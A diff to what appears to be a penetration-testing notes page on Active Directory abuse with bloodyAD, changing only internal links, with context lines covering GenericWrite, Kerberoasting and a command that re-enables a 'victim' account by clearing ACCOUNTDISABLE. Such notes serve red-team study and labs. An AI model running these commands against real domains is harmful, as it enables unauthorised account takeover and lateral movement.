@@ -4,7 +4,7 @@ sudo apt install bloodyad
 
 ## GenericWrite
 
-If ADCS is installed, try [shadow credentials]({{< relref "8. Lateral Movement/ADCS attacks#shadow-credentials" >}}) first
+If ADCS is installed, try [shadow credentials]({{< relref "8. Lateral Movement/ADCS Attacks/_index#shadow-credentials" >}}) first
 ## Kerberoast
 
 > NOTE: Use when you have `GenericWrite` or `WriteSPN` on a **user**
@@ -63,7 +63,7 @@ bloodyAD --host 'dc01.domain.name' -d 'domain.name' -u 'user' -p 'password' get 
 
 ## Enable account
 
-> NOTE: See [8. Lateral Movement/AD Enumeration/Get All Properties#Writable Objects]({{< relref "8. Lateral Movement/AD Enumeration/Get All Properties#writable-objects" >}}). If we can write to `UserAccountControl` then we can enable the account
+> NOTE: See [Writable Objects]({{< relref "8. Lateral Movement/AD Enumeration/Writable Objects" >}}). If we can write to `UserAccountControl` then we can enable the account
 
 ```sh
 bloodyAD --host 'dc01.domain.name' -d 'domain.name' -u 'user' -p 'password' remove uac 'victim' -f ACCOUNTDISABLE
